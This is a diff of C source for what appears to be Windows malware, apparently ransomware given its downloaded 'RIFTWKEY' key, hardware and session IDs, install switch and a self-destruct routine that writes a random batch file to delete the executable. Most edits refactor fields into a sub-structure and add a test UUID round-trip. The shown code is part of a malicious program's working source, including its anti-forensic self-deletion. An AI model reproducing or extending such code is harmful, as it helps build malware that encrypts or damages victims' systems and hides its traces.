@@ -12,13 +12,17 @@ INT WINAPI wWinMain(
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
 	{	// Initialize Process Information Block
-		g_PIB->hMH = hInstance;
-		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
+		g_PIB->sMod.hMH = hInstance;
+		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
 		EXoshiroBegin(NULL);
 		IGenerateHardwareId(&g_PIB->sID.HW);
 		IGenerateSessionId(&g_PIB->sID.SE);
-		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, g_PIB->sArg.n);
+		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, &g_PIB->sArg.n); // bugy (sometimes causes an excepion)
 	}
+
+	PCSTR testid = EUuidEncodeA(&g_PIB->sID.HW);
+	UUID test;
+	EUuidDecodeA(testid, &test);
 
 	if (g_PIB->sArg.n > 0) {
 		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation
@@ -52,7 +56,7 @@ INT WINAPI wWinMain(
 	PVOID pWKey = IDownloadKey();
 	if (!pWKey) {
 		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
-		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
+		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
 	} if (pWKey)
@@ -86,6 +90,7 @@ INT WINAPI wWinMain(
 
 	{	// CleanUp
 		EXoshiroEnd(NULL);
+		LocalFree(g_PIB->sArg.v);
 		HeapFree(g_PIB->hPH, NULL, g_PIB);
 	} return 0;
 }
@@ -108,14 +113,14 @@ VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
 	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
 	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
-	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
+	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
 	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
 	PVOID pScriptW = AllocMemory(0x800);
 	UINT uiRandomID = EXoshiroSS(NULL);
-	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
+	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->sMod.szMFN);
 	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
 
 	// Convert to Raw (ANSI)
